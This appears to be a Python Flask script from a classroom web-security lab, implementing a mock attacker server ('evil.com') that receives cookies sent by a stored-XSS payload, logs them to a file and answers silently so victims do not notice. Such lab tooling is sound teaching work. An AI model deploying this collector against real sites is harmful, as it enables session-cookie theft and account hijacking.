"""
evil.com — the attacker's collection server for VulnLab.

Runs on port 6001, separate from the victim app (127.0.0.1:5050). It exists
so cookie theft is shown END TO END (stolen cookies land here), instead of
just printing document.cookie in the victim's own console.

    python evil_server.py

⚠️  For authorized classroom use against the local VulnLab app ONLY.
"""
import datetime
import os

from flask import Flask, request

app = Flask(__name__)
LOG = os.path.join(os.path.dirname(__file__), "stolen.log")


@app.route("/steal")
def steal():
    """Stored-XSS payload beacons the victim's cookie here as ?c=..."""
    cookie = request.args.get("c", "")
    stamp = datetime.datetime.now().isoformat(timespec="seconds")
    line = "[%s] STOLEN from %s : %s" % (stamp, request.remote_addr, cookie)
    print("\n" + line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")
    return "", 204  # empty response; the victim never notices


@app.route("/")
def index():
    return ("evil.com attacker server.<br>"
            "Endpoint: <code>/steal?c=...</code> (cookie drop). "
            "Stolen cookies are logged to attacker/stolen.log.")


if __name__ == "__main__":
    print("evil.com listening on http://127.0.0.1:6001  (logging to %s)" % LOG)
    app.run(host="127.0.0.1", port=6001, debug=True)
